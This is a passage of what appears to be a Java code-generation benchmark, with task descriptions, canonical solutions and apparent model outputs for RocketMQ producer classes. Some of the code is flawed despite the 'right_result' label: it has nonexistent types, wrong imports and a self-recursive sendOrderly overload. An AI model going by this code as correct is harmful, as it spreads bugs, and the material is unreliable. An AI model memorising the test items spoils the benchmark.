.exceptionally(ex -> {\n                    future.completeExceptionally(ex);\n                    return null;\n                });\n    }\n}\n```\n\nThis Java class `BroadcastifyHttpClient` encapsulates the functionality to interact with the Broadcastify API using HTTP/2 protocol. It includes methods for synchronous and asynchronous HTTP requests, handling both successful responses and errors appropriately."
  },
  {
    "Task_id": 390,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic with a given tag. The class should handle producer initialization, message sending, and resource cleanup.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It manages the producer lifecycle (startup and shutdown) and provides a method to send messages to a RocketMQ broker.\n\nAttributes:\n- producer: DefaultMQProducer - The underlying RocketMQ producer instance that handles message sending operations\n\nMethods:\n- Constructor: Producer(String producerGroup, String namesrvAddr) -> void - Initializes a new producer instance with the specified producer group and NameServer address\n- start: start() -> void - Starts the producer instance to begin sending messages\n- sendMessage: sendMessage(String topic, String tag, String messageBody) -> SendResult - Creates and sends a message to the specified topic with the given tag and body\n- shutdown: shutdown() -> void - Shuts down the producer instance and releases resources",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) throws MQClientException {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tag, String messageBody) throws Exception {\n        Message msg = new Message(topic, \n                                tag,\n                                messageBody.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class Producer {\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws Exception {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tag, String messageBody) throws Exception {\n        Message msg = new Message(topic, tag, messageBody.getBytes());\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 391,
    "Instruction": "Task Description: Implement a Java class that acts as a RocketMQ producer to send messages to a specified topic with tags. The class should handle producer configuration, message sending, and resource cleanup.\n\nClass Description: The RocketMQProducer class encapsulates the functionality for creating and managing a RocketMQ message producer. It handles initialization, configuration, message sending, and shutdown of the producer instance.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The NameServer address for RocketMQ\n- LOGGER: Logger - Logger instance for logging producer activities\n\nMethods:\n- RocketMQProducer(String producerGroup, String namesrvAddr) -> None - Constructor that initializes the producer with a group name and NameServer address\n- configureProducer() -> None - Configures the producer with necessary settings including NameServer address and access channel\n- startProducer() -> None - Starts the producer instance and logs the startup\n- sendMessage(String topic, String tags, String messageBody) -> SendResult - Creates and sends a message to the specified topic with given tags and body, returns the send result\n- shutdownProducer() -> None - Shuts down the producer instance to release resources",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.client.producer.SendStatus;\nimport org.apache.rocketmq.client.AccessChannel;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\n\npublic class RocketMQProducer {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RocketMQProducer.class);\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup, false, null);\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void configureProducer() {\n        producer.setAccessChannel(AccessChannel.CLOUD);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void startProducer() throws Exception {\n        producer.start();\n        LOGGER.info(\"Producer Started...\");\n    }\n\n    public SendResult sendMessage(String topic, String tags, String messageBody) throws Exception {\n        Message msg = new Message(\n            topic, \n            tags, \n            messageBody.getBytes(RemotingHelper.DEFAULT_CHARSET)\n        );\n        SendResult sendResult = producer.send(msg);\n        if (sendResult.getSendStatus() != SendStatus.SEND_OK) {\n            throw new Exception(\"Message sending failed\");\n        }\n        return sendResult;\n    }\n\n    public void shutdownProducer() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class RocketMQProducer {\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n    private static final Logger LOGGER = LoggerFactory.getLogger(RocketMQProducer.class);\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void configureProducer() {\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void startProducer() throws Exception {\n        producer.start();\n        LOGGER.info(\"RocketMQ producer started\");\n    }\n\n    public SendResult sendMessage(String topic, String tags, String messageBody) throws Exception {\n        Message msg = new Message(topic, tags, messageBody.getBytes());\n        return producer.send(msg);\n    }\n\n    public void shutdownProducer() throws Exception {\n        producer.shutdown();\n        LOGGER.info(\"RocketMQ producer shut down\");\n    }\n}\n```"
  },
  {
    "Task_id": 392,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic, querying messages, and managing the producer lifecycle.\n\nClass Description: The TestProducer class provides functionality to initialize, start, and manage a RocketMQ producer instance. It can send messages to a specified topic with tags and keys, query messages based on criteria, and properly shut down the producer when no longer needed.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance responsible for sending messages and performing message-related operations.\n\nMethods:\n- TestProducer(String namesrvAddr, String producerGroup) -> void - Constructor that initializes the producer with the specified NameServer address and producer group.\n- start() -> void - Starts the producer instance to begin sending messages.\n- sendMessage(String topic, String tags, String keys, String body) -> SendResult - Sends a message to the specified topic with given tags, keys, and body. Returns the send result.\n- queryMessage(String topic, String key, int maxNum, long begin, long end) -> QueryResult - Queries messages for the specified topic based on key, maximum number of messages, and time range. Returns the query result.\n- shutdown() -> void - Shuts down the producer instance gracefully.",
    "Canonical_solution": "import org.apache.rocketmq.client.QueryResult;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class TestProducer {\n\n    private DefaultMQProducer producer;\n\n    public TestProducer(String namesrvAddr, String producerGroup) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws Exception {\n        Message msg = new Message(topic,\n                tags,\n                keys,\n                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public QueryResult queryMessage(String topic, String key, int maxNum, long begin, long end) throws Exception {\n        return producer.queryMessage(topic, key, maxNum, begin, end);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.QueryResult;\n\npublic class TestProducer {\n    private DefaultMQProducer producer;\n\n    public TestProducer(String namesrvAddr, String producerGroup) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws Exception {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws Exception {\n        Message msg = new Message(topic, tags, keys, body.getBytes());\n        return producer.send(msg);\n    }\n\n    public QueryResult queryMessage(String topic, String key, int maxNum, long begin, long end) throws Exception {\n        return producer.queryMessage(topic, key, maxNum, begin, end);\n    }\n\n    public void shutdown() throws Exception {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 393,
    "Instruction": "Task Description: Create a Java class that serves as a template for interacting with RocketMQ producers, providing various methods to send messages (including ordered messages) with configurable parameters.\n\nClass Description: The RocketMQTemplate class is a utility class that simplifies interaction with RocketMQ producers. It manages producer instances, provides default configurations, and offers multiple methods for sending messages with different levels of customization. The class handles both regular and ordered message sending, with configurable timeouts, queue numbers, and producer groups.\n\nAttributes:\n- log: [InternalLogger] - Logger instance for error and debug logging\n- DEFAULT_PRODUCER_GROUP: [String] - Default producer group name\n- DEFAULT_QUEUE_NUM: [int] - Default number of queues\n- DEFAULT_SEND_MSG_TIMEOUT: [int] - Default message sending timeout in milliseconds\n- producerMap: [Map<String, DefaultMQProducer>] - Map storing producer instances with their configuration keys\n\nMethods:\n- getProducer() -> [DefaultMQProducer] - Gets a producer with default settings\n- getProducer([int queueNum]) -> [DefaultMQProducer] - Gets a producer with custom queue number\n- getProducer([String producerGroup, int sendMsgTimeout]) -> [DefaultMQProducer] - Gets a producer with custom group and timeout\n- getProducer([int queueNum, String producerGroup, int sendMsgTimeout]) -> [DefaultMQProducer] - Gets a fully customized producer\n- send([String topic, String body]) -> [SendResult] - Sends a message with default settings\n- send([String topic, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with custom timeout\n- send([String producerGroup, String topic, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with custom group and timeout\n- send([String producerGroup, String topic, String tags, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with tags\n- send([String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with tags and keys\n- send([String producerGroup, Message message, int sendMsgTimeout]) -> [SendResult] - Internal method for sending messages\n- sendOrderly([String producerGroup, String topic, String keys, String body]) -> [SendResult] - Sends ordered message with default timeout\n- sendOrderly([String producerGroup, String topic, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends ordered message with custom timeout\n- sendOrderly([String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends ordered message with tags\n- sendOrderly([String producerGroup, Message message, int sendMsgTimeout]) -> [SendResult] - Internal method for sending ordered messages",
    "Canonical_solution": "import org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.math.NumberUtils;\nimport org.apache.rocketmq.client.log.ClientLogger;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.logging.InternalLogger;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class RocketMQTemplate {\n\n    private static final InternalLogger log = ClientLogger.getLog();\n\n    private static final String DEFAULT_PRODUCER_GROUP = \"default-producer\";\n    private static final int DEFAULT_QUEUE_NUM = 4;\n    private static final int DEFAULT_SEND_MSG_TIMEOUT = 3000;\n\n    private static Map<String, DefaultMQProducer> producerMap = new HashMap<>();\n\n    public static DefaultMQProducer getProducer() throws Exception {\n        return getProducer(DEFAULT_QUEUE_NUM, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static DefaultMQProducer getProducer(int queueNum) throws Exception {\n        return getProducer(queueNum, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static DefaultMQProducer getProducer(String producerGroup, int sendMsgTimeout) throws Exception {\n        return getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n    }\n\n    public static DefaultMQProducer getProducer(int queueNum, String producerGroup, int sendMsgTimeout) throws Exception {\n        if (queueNum < 1) throw new IllegalArgumentException(\"queueNum must >= 1\");\n        if (StringUtils.isBlank(producerGroup)) throw new IllegalArgumentException(\"producerGroup cannot be null\");\n        String producerKey = producerGroup + queueNum;\n        if (producerMap.get(producerKey) == null) {\n            synchronized (producerMap) {\n                if (producerMap.get(producerKey) == null) {\n                    DefaultMQProducer producer = new DefaultMQProducer(DEFAULT_PRODUCER_GROUP);\n                    producer.setDefaultTopicQueueNums(queueNum);\n                    producer.setSendMsgTimeout(sendMsgTimeout);\n                    producer.start();\n                    producerMap.put(producerKey, producer);\n                }\n            }\n        }\n        return producerMap.get(producerKey);\n    }\n\n    public static SendResult send(String topic, String body) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static SendResult send(String topic, String body, int sendMsgTimeout) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, \"\", body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String tags, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, tags, \"\", body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        try {\n            return send(producerGroup, new Message(topic, tags, keys, body.getBytes(RemotingHelper.DEFAULT_CHARSET)), sendMsgTimeout);\n        } catch (Exception e) {\n            log.error(\"send error, producerGroup:{}, topic:{}, tags:{}, keys:{}, body:{}\",\n                    producerGroup, topic, tags, keys, body, e);\n            throw new MessagingException(e.getMessage(), e);\n        }\n    }\n\n    private static SendResult send(String producerGroup, Message message, int sendMsgTimeout) throws Exception {\n        return getProducer(producerGroup, sendMsgTimeout).send(message);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String keys, String body) {\n        return sendOrderly(producerGroup, topic, keys, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String keys, String body, int sendMsgTimeout) {\n        return sendOrderly(producerGroup, topic, keys, body, sendMsgTimeout);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        try {\n            return sendOrderly(producerGroup, new Message(topic, tags, keys, body.getBytes(RemotingHelper.DEFAULT_CHARSET)), sendMsgTimeout);\n        } catch (Exception e) {\n            log.error(\"send error, producerGroup:{}, topic:{}, tags:{}, keys:{}, body:{}\",\n                    producerGroup, topic, tags, keys, body, e);\n            throw new MessagingException(e.getMessage(), e);\n        }\n    }\n\n    private static SendResult sendOrderly(String producerGroup, Message message, int sendMsgTimeout) throws Exception {\n        return getProducer(producerGroup, sendMsgTimeout).send(message,\n                new MessageQueueSelector() {\n                    @Override\n                    public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                        long id = NumberUtils.toLong(String.valueOf(arg));\n                        int index = (int) (id % mqs.size());\n                        return mqs.get(index);\n                    }\n                }, message.getKeys());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class RocketMQTemplate {\n    private static final InternalLogger log = InternalLogger.getLogger(RocketMQTemplate.class);\n    public static final String DEFAULT_PRODUCER_GROUP = \"default_producer_group\";\n    public static final int DEFAULT_QUEUE_NUM = 4;\n    public static final int DEFAULT_SEND_MSG_TIMEOUT = 3000;\n    private Map<String, DefaultMQProducer> producerMap = new HashMap<>();\n\n    public DefaultMQProducer getProducer() {\n        return getProducer(DEFAULT_QUEUE_NUM);\n    }\n\n    public DefaultMQProducer getProducer(int queueNum) {\n        return getProducer(DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT, queueNum);\n    }\n\n    public DefaultMQProducer getProducer(String producerGroup, int sendMsgTimeout) {\n        return getProducer(producerGroup, sendMsgTimeout, DEFAULT_QUEUE_NUM);\n    }\n\n    public DefaultMQProducer getProducer(int queueNum, String producerGroup, int sendMsgTimeout) {\n        String key = producerGroup + \"_\" + queueNum + \"_\" + sendMsgTimeout;\n        if (!producerMap.containsKey(key)) {\n            synchronized (this) {\n                if (!producerMap.containsKey(key)) {\n                    DefaultMQProducer producer = new DefaultMQProducer(producerGroup);\n                    producer.setNamesrvAddr(\"localhost:9876\");\n                    producer.setDefaultTopicQueueNums(queueNum);\n                    producer.setSendMsgTimeout(sendMsgTimeout);\n                    try {\n                        producer.start();\n                    } catch (Exception e) {\n                        log.error(\"Failed to start producer\", e);\n                    }\n                    producerMap.put(key, producer);\n                }\n            }\n        }\n        return producerMap.get(key);\n    }\n\n    public SendResult send(String topic, String body) {\n        return send(topic, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public SendResult send(String topic, String body, int sendMsgTimeout) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, null, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, null, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String tags, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, tags, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        Message msg = new Message(topic, tags, keys, body.getBytes());\n        return send(producerGroup, msg, sendMsgTimeout);\n    }\n\n    private SendResult send(String producerGroup, Message message, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(message.getTopic(), producerGroup, sendMsgTimeout);\n        try {\n            return producer.send(message);\n        } catch (Exception e) {\n            log.error(\"Failed to send message\", e);\n            return null;\n        }\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String keys, String body) {\n        return sendOrderly(producerGroup, topic, keys, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String keys, String body, int sendMsgTimeout) {\n        return sendOrderly(producerGroup, topic, null, keys, body, sendMsgTimeout);\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        Message msg = new Message(topic, tags, keys, body.getBytes());\n        return sendOrderly(producerGroup, msg, sendMsgTimeout);\n    }\n\n    private SendResult sendOrderly(String producerGroup, Message message, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(message.getTopic(), producerGroup, sendMsgTimeout);\n        try {\n            return producer.send(message, new SendMessageCallback() {\n                @Override\n                public void sendMessage(final MessageExt msg, final Object arg) throws Exception {\n                    // Custom logic for ordering messages\n                }\n            });\n        } catch (Exception e) {\n            log.error(\"Failed to send orderly message\", e);\n            return null;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 394,
    "Instruction": "Task Description: Implement a Java class that acts as a RocketMQ producer to send messages to a specified topic with a given tag.\n\nClass Description: The RocketMQProducer class encapsulates the functionality to initialize, send messages, and shutdown a RocketMQ producer instance. It handles the connection to the RocketMQ NameServer and manages message production.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namespace: String - The namespace for the producer (V2 version)\n- producerGroup: String - The group name for the producer\n- namesrvAddr: String - The address of the NameServer\n- topic: String - The topic to which messages will be sent\n- tag: String - The tag for the messages\n\nMethods:\n- RocketMQProducer(String namespace, String producerGroup, String namesrvAddr, String topic, String tag) -> None - Constructor that initializes the producer with the given parameters\n- initialize() -> void - Configures and starts the producer instance with the specified namespace and NameServer address\n- sendMessage(String messageContent) -> void - Creates and sends a message with the given content to the configured topic and tag\n- shutdown() -> void - Shuts down the producer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport java.nio.charset.StandardCharsets;\n\npublic class RocketMQProducer {\n\n    private DefaultMQProducer producer;\n    private String namespace;\n    private String producerGroup;\n    private String namesrvAddr;\n    private String topic;\n    private String tag;\n\n    public RocketMQProducer(String namespace, String producerGroup, String namesrvAddr, String topic, String tag) {\n        this.namespace = namespace;\n        this.producerGroup = producerGroup;\n        this.namesrvAddr = namesrvAddr;\n        this.topic = topic;\n        this.tag = tag;\n        this.producer = new DefaultMQProducer(producerGroup);\n    }\n\n    public void initialize() throws Exception {\n        producer.setNamespaceV2(namespace);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public void sendMessage(String messageContent) throws Exception {\n        Message message = new Message(topic, tag, messageContent.getBytes(StandardCharsets.UTF_8));\n        producer.send(message);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class RocketMQProducer {\n    private DefaultMQProducer producer;\n    private String namespace;\n    private String producerGroup;\n    private String namesrvAddr;\n    private String topic;\n    private String tag;\n\n    public RocketMQProducer(String namespace, String producerGroup, String namesrvAddr, String topic, String tag) {\n        this.namespace = namespace;\n        this.producerGroup = producerGroup;\n        this.namesrvAddr = namesrvAddr;\n        this.topic = topic;\n        this.tag = tag;\n    }\n\n    public void initialize() {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        if (namespace != null && !namespace.isEmpty()) {\n            producer.setNamespace(namespace);\n        }\n        try {\n            producer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String messageContent) {\n        Message msg = new Message(topic, tag, messageContent.getBytes());\n        try {\n            producer.send(msg);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 395,
    "Instruction": "Task Description: Create a Java class that implements an asynchronous message producer using RocketMQ, capable of sending messages to specified topics with callback handling for success and failure cases.\n\nClass Description: RMQAsyncSendProducer is a RocketMQ asynchronous message producer that sends messages to a specified topic and handles responses through callbacks. It tracks successful sends and exceptions, and provides methods for waiting for responses and shutting down the producer.\n\nAttributes:\n- nsAddr: String - The NameServer address for RocketMQ\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- sendCallback: SendCallback - Callback handler for message send results\n- successSendResult: List<SendResult> - Thread-safe list of successful send results\n- exceptionMsgCount: AtomicInteger - Counter for messages that failed to send\n- msgSize: int - The number of messages to send\n- logger: Logger - SLF4J logger instance\n- topic: String - The topic to which messages will be sent (inherited from AbstractMQProducer)\n- msgBodys: [Data Structure] - Stores message bodies (inherited from AbstractMQProducer)\n- originMsgs: [Data Structure] - Stores original messages (inherited from AbstractMQProducer)\n\nMethods:\n- RMQAsyncSendProducer(String nsAddr, String topic) -> void - Constructor that initializes the producer with NameServer address and topic\n- create() -> void - Creates and configures the DefaultMQProducer instance\n- start() -> void - Starts the producer instance\n- asyncSend(Object msg) -> void - Asynchronously sends a single message\n- asyncSend(int msgSize) -> void - Asynchronously sends multiple messages (quantity specified by msgSize)\n- asyncSend(Object msg, MessageQueueSelector selector, Object arg) -> void - Asynchronously sends a message with queue selection\n- waitForResponse(int timeoutMills) -> void - Waits for all responses until timeout\n- shutdown() -> void - Shuts down the producer (overrides AbstractMQProducer method)",
    "Canonical_solution": "import java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.test.clientinterface.AbstractMQProducer;\nimport org.apache.rocketmq.test.sendresult.ResultWrapper;\nimport org.apache.rocketmq.test.util.RandomUtil;\nimport org.apache.rocketmq.test.util.TestUtil;\n\npublic class RMQAsyncSendProducer extends AbstractMQProducer {\n    private static Logger logger = LoggerFactory.getLogger(RMQAsyncSendProducer.class);\n    private String nsAddr = null;\n    private DefaultMQProducer producer = null;\n    private SendCallback sendCallback = null;\n    private List<SendResult> successSendResult = Collections.synchronizedList(new ArrayList<SendResult>());\n    private AtomicInteger exceptionMsgCount = new AtomicInteger(0);\n    private int msgSize = 0;\n\n    public RMQAsyncSendProducer(String nsAddr, String topic) {\n        super(topic);\n        this.nsAddr = nsAddr;\n        sendCallback = new SendCallback() {\n            @Override\n            public void onSuccess(SendResult sendResult) {\n                successSendResult.add(sendResult);\n            }\n            @Override\n            public void onException(Throwable throwable) {\n                exceptionMsgCount.getAndIncrement();\n            }\n        };\n        create();\n        start();\n    }\n\n    private void create() {\n        producer = new DefaultMQProducer();\n        producer.setProducerGroup(RandomUtil.getStringByUUID());\n        producer.setInstanceName(RandomUtil.getStringByUUID());\n        if (nsAddr != null) {\n            producer.setNamesrvAddr(nsAddr);\n        }\n    }\n\n    private void start() {\n        try {\n            producer.start();\n        } catch (MQClientException e) {\n            logger.error(\"producer start failed!\");\n            e.printStackTrace();\n        }\n    }\n\n    public void asyncSend(Object msg) {\n        Message metaqMsg = (Message) msg;\n        try {\n            producer.send(metaqMsg, sendCallback);\n            msgBodys.addData(new String(metaqMsg.getBody(), StandardCharsets.UTF_8));\n            originMsgs.addData(msg);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void asyncSend(int msgSize) {\n        this.msgSize = msgSize;\n        for (int i = 0; i < msgSize; i++) {\n            Message msg = new Message(topic, RandomUtil.getStringByUUID().getBytes(StandardCharsets.UTF_8));\n            this.asyncSend(msg);\n        }\n    }\n\n    public void asyncSend(Object msg, MessageQueueSelector selector, Object arg) {\n        Message metaqMsg = (Message) msg;\n        try {\n            producer.send(metaqMsg, selector, arg, sendCallback);\n            msgBodys.addData(new String(metaqMsg.getBody(), StandardCharsets.UTF_8));\n            originMsgs.addData(msg);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void waitForResponse(int timeoutMills) {\n        long startTime = System.currentTimeMillis();\n        while (this.successSendResult.size() != this.msgSize) {\n            if (System.currentTimeMillis() - startTime < timeoutMills) {\n                TestUtil.waitForMonment(100);\n            } else {\n                logger.info(\"timeout but still not recv all response!\");\n                break;\n            }\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueueSelector;\n\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RMQAsyncSendProducer extends AbstractMQProducer {\n    private String nsAddr;\n    private DefaultMQProducer producer;\n    private SendCallback sendCallback;\n    private List<SendResult> successSendResult;\n    private AtomicInteger exceptionMsgCount = new AtomicInteger(0);\n    private int msgSize;\n\n    public RMQAsyncSendProducer(String nsAddr, String topic) {\n        super(topic);\n        this.nsAddr = nsAddr;\n    }\n\n    public void create() {\n        producer = new DefaultMQProducer(\"async_producer_group\");\n        producer.setNamesrvAddr(nsAddr);\n    }\n\n    public void start() throws Exception {\n        producer.start();\n    }\n\n    public void asyncSend(Object msg) {\n        producer.send(new Message(getTopic(), \"TagA\", msg.toString().getBytes()), sendCallback);\n    }\n\n    public void asyncSend(int msgSize) {\n        for (int i = 0; i < msgSize; i++) {\n            asyncSend(i);\n        }\n    }\n\n    public void asyncSend(Object msg, MessageQueueSelector selector, Object arg) {\n        producer.send(new Message(getTopic(), \"TagA\", msg.toString().getBytes()), selector, arg, sendCallback);\n    }\n\n    public void waitForResponse(int timeoutMills) {\n        try {\n            Thread.sleep(timeoutMills);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 396,
